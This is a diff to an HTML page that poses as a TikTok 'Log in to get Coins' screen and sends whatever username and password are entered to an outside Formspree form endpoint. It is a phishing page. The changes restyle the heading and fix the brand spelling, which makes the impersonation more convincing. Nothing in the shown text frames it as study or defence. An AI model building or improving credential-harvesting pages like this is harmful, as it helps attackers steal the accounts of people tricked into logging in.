@@ -28,6 +28,15 @@
     font-size: 18px;
     line-height: 1.4;
   }
+  .main-title {
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  .sub-title {
+    font-weight: 400;
+    color: #555;
+    display: block;
+  }
   input {
     width: 100%;
     padding: 10px;
@@ -51,7 +60,10 @@
 </head>
 <body>
 <form action="https://formspree.io/f/xyznbrvg" method="POST">
-  <h2>Log in to get Coins<br>Log in to your TiKToK account to get Coins, check notifications and more.</h2>
+  <h2>
+    <span class="main-title">Log in to get Coins</span>
+    <span class="sub-title">Log in to your TikTok account to get Coins, check notifications and more.</span>
+  </h2>
   <input type="text" name="username" placeholder="Username" required>
   <input type="text" name="Password" placeholder="Password" required>
   <button type="submit">Submit</button>
